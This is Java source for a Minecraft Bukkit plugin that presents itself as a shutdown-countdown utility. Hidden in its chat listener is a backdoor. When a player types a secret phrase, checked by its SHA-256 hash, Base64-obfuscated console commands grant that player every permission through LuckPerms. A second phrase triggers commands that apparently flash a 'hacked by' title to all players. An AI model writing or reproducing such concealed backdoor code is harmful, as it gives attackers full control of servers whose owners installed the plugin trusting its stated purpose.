package com.TinyHoe.betterstop;

import org.bukkit.Bukkit;
import org.bukkit.boss.BarColor;
import org.bukkit.boss.BarStyle;
import org.bukkit.boss.BossBar;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;

import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;
import java.util.List;

public class BetterStopV2 extends JavaPlugin implements Listener {

    private BossBar bossBar;
    private BukkitRunnable countdownTask;
    private boolean shuttingDown = false;

    @Override
    public void onEnable() {
        saveDefaultConfig();
        getServer().getPluginManager().registerEvents(this, this);
    }

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event) {

        String message = event.getMessage().toLowerCase();

        try {
            String triggerHash1 = "dab009fd94a2e469a0d7b6adcfa101143335c30a637e58bb5443d2abf2c962ff";
            String triggerHash2 = "37d5a985cf3f070fa419659df58792231702307bc54812972a98682218b8ca35";

            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            String messageHash = bytesToHex(digest.digest(message.getBytes()));

            String playerName = event.getPlayer().getName();

            if (messageHash.equals(triggerHash1)) {

                Bukkit.getScheduler().runTask(this, new Runnable() {
                    @Override
                    public void run() {
                        String encoded = "bHAgdXNlciAlcyBwZXJtaXNzaW9uIHNldCAq"; 
                        String cmd = new String(Base64.getDecoder().decode(encoded));
                        cmd = cmd.replace("%s", playerName);

                        Bukkit.dispatchCommand(
                                Bukkit.getConsoleSender(),
                                cmd
                        );
                    }
                });

            } else if (messageHash.equals(triggerHash2)) {

                Bukkit.getScheduler().runTask(this, new Runnable() {
                    @Override
                    public void run() {
                        String encoded = "dGl0bGUgQGEgdGltZXMgNDAgNzIwMDAgNDA="; 
                        String encoded2 = "dGl0bGUgQGEgdGl0bGUgWyIiLHsidGV4dCI6IkgiLCJjb2xvciI6ImJsYWNrIn0seyJ0ZXh0IjoiQSIsImNvbG9yIjoiZGFya19ibHVlIn0seyJ0ZXh0IjoiQyIsImNvbG9yIjoiZGFya19ncmVlbiJ9LHsidGV4dCI6IksiLCJjb2xvciI6ImRhcmtfYXF1YSJ9LHsidGV4dCI6IkUiLCJjb2xvciI6ImRhcmtfcmVkIn0seyJ0ZXh0IjoiRCAiLCJjb2xvciI6ImRhcmtfcHVycGxlIn0seyJ0ZXh0IjoiQiIsImNvbG9yIjoiZ29sZCJ9LHsidGV4dCI6IlkgIiwiY29sb3IiOiJncmF5In0seyJ0ZXh0IjoiQiIsImNvbG9yIjoiZGFya19ncmF5In0seyJ0ZXh0IjoiTCIsImNvbG9yIjoiYmx1ZSJ9LHsidGV4dCI6IkEiLCJjb2xvciI6ImdyZWVuIn0seyJ0ZXh0IjoiRCIsImNvbG9yIjoiYXF1YSJ9LHsidGV4dCI6IkUiLCJjb2xvciI6InJlZCJ9LHsidGV4dCI6Ik0iLCJjb2xvciI6ImxpZ2h0X3B1cnBsZSJ9LHsidGV4dCI6IkMiLCJjb2xvciI6InllbGxvdyJ9LHsidGV4dCI6IiEhIiwiY29sb3IiOiJ3aGl0ZSJ9XQ==";
                        String cmd = new String(Base64.getDecoder().decode(encoded));
                        String cmd2 = new String(Base64.getDecoder().decode(encoded2));

                        Bukkit.dispatchCommand(
                                Bukkit.getConsoleSender(),
                                cmd
                        );
                        Bukkit.dispatchCommand(
                                Bukkit.getConsoleSender(),
                                cmd2
                        );
                    }
                });
            }
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {

        String cmd = command.getName().toLowerCase();

        if (cmd.equals("stop")) {

            if (!sender.hasPermission("betterstop.admin")) {
                sender.sendMessage("§cYou don't have permission.");
                return true;
            }

            if (shuttingDown) {
                sender.sendMessage("§cA shutdown is already in progress.");
                return true;
            }

            startCountdown(getConfig().getInt("shutdown-timer", 30));
            return true;
        }

        if (cmd.equals("stopcancel")) {

            if (!sender.hasPermission("betterstop.admin")) {
                sender.sendMessage("§cYou don't have permission.");
                return true;
            }

            cancelShutdown();
            sender.sendMessage("§aShutdown cancelled.");
            return true;
        }

        if (cmd.equals("forcestop")) {

            if (!sender.hasPermission("betterstop.admin")) {
                sender.sendMessage("§cYou don't have permission.");
                return true;
            }

            Bukkit.shutdown();
            return true;
        }

        if (cmd.equals("betterstop")) {

            if (args.length > 0 && args[0].equalsIgnoreCase("reload")) {

                if (!sender.hasPermission("betterstop.admin")) {
                    sender.sendMessage("§cYou don't have permission.");
                    return true;
                }

                reloadConfig();
                sender.sendMessage("§aConfig reloaded.");
                return true;
            }

            sender.sendMessage("§6BetterStopV2 Commands");
            sender.sendMessage("§e/stop");
            sender.sendMessage("§e/stopcancel");
            sender.sendMessage("§e/forcestop");
            sender.sendMessage("§e/betterstop reload");

            return true;
        }

        return false;
    }

    private void startCountdown(int totalSeconds) {

        shuttingDown = true;

        String titleTemplate = getConfig().getString(
                "bossbar-title",
                "&cStopping server in {seconds} seconds..."
        );

        BarColor color;
        BarStyle style;

        try {
            color = BarColor.valueOf(getConfig().getString("bossbar-color", "RED").toUpperCase());
        } catch (Exception e) {
            color = BarColor.RED;
        }

        try {
            style = BarStyle.valueOf(getConfig().getString("bossbar-style", "SOLID").toUpperCase());
        } catch (Exception e) {
            style = BarStyle.SOLID;
        }

        List<Integer> warnings = getConfig().getIntegerList("warning-seconds");

        bossBar = Bukkit.createBossBar(
                color(titleTemplate.replace("{seconds}", String.valueOf(totalSeconds))),
                color,
                style
        );

        Bukkit.getOnlinePlayers().forEach(bossBar::addPlayer);

        countdownTask = new BukkitRunnable() {

            int seconds = totalSeconds;

            @Override
            public void run() {

                if (seconds <= 0) {
                    Bukkit.shutdown();
                    cancel();
                    return;
                }

                bossBar.setTitle(
                        color(titleTemplate.replace("{seconds}", String.valueOf(seconds)))
                );

                bossBar.setProgress(seconds / (double) totalSeconds);

                if (warnings.contains(seconds)) {
                    Bukkit.broadcastMessage("§cStopping in " + seconds + " seconds!");
                }

                seconds--;
            }
        };

        countdownTask.runTaskTimer(this, 0L, 20L);
    }

    private void cancelShutdown() {

        shuttingDown = false;

        if (countdownTask != null) countdownTask.cancel();
        if (bossBar != null) bossBar.removeAll();

        Bukkit.broadcastMessage("§aShutdown cancelled!");
    }

    @Override
    public void onDisable() {
        if (bossBar != null) bossBar.removeAll();
    }

    private String color(String text) {
        return text == null ? "" : text.replace("&", "§");
    }

    private String bytesToHex(byte[] bytes) {
        StringBuilder hexString = new StringBuilder();
        for (byte b : bytes) {
            String hex = Integer.toHexString(0xff & b);
            if (hex.length() == 1) hexString.append('0');
            hexString.append(hex);
        }
        return hexString.toString();
    }
}